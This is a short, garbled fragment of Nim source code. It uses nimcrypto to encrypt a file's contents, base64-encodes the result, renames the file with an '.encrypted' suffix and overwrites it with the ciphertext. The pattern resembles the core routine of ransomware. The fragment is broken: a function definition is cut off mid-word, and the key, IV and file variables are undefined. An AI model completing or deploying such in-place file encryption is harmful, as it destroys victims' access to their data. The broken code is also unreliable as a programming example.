import os
import strformat
import base64
import nimcrypto

fu
    
    ectx.init(key, iv)
    ectx.encrypt(plaintext, encrypted)
    ectx.clear()

    let encodedCrypted = encode(encrypted)
    let finalFile = file & ".encrypted" 
    moveFile(file, finalFile)
    writeFile(finalFile, encodedCrypted)

